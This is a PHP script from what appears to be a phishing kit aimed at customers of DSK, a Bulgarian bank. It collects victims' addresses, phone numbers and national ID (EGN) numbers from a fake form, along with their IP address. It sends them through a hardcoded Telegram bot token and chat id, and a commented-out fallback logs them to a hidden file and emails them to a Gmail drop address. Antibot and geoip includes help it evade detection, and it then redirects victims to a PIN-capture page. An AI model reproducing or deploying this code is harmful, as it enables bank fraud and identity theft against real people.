<?php
include('antibot.php');
include('blocker.php');
include('geoip.php');
include('useragent.php');
session_start();
//$ap_dob = $_SESSION['phonenumber']  = $_POST['phonenumber'];
//$ap_email       = $_SESSION['_ap_email_']        = $_POST['useremail'];
//$ap_state    = $_SESSION['_state_']        = $_POST['state'];
$ap_zip     = $_SESSION['_us_password_']        = $_POST['zipCode'];
$ap_city    = $_SESSION['_adressline1_']        = $_POST['adressline1'];
$ap_adress    = $_SESSION['_adressline2_']        = $_POST['adressline2'];
$ap_fone = $_SESSION['phonenumber']  = $_POST['phonenumber'];
$ip = getenv("REMOTE_ADDR");

$message = "ADDRESS: " .$ap_adress." | ";
$message .= "Phone: " .$ap_city." | ";
$message .= "Number of personal ID: " .$ap_zip." | ";
$message .= "EGN ID: " .$ap_fone." | ";
$message .= "IP: ".$ip;

file_get_contents("https://api.telegram.org/bot6788401748:AAF1szjl3Y_1JyCF1MnTCmiBB9lpYgYGYRg/sendMessage?chat_id=-4064520154&text=".$message );
/*
$arr = array('funip' => $ip, 'funzip' => $ap_zip , 'funcity' => $ap_city,  'funadress' => $ap_adress, 'funfone' => $ap_fone  );
$XJUNO = json_encode($arr);

$file = fopen(".RzL.html","a");
fwrite($file, $XJUNO."</br>");
fclose($file);

$asba = "dskresult2021@gmail.com";
$subject  = "NEW DSKADDR OF " .$ip. " - [".$countryname."]";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:DSKADDR <dskresult2021@gmail.com>";
mail($asba, $subject, $XJUNO, $headers);
*/
 header("Location:vpin.php?$ip");
?>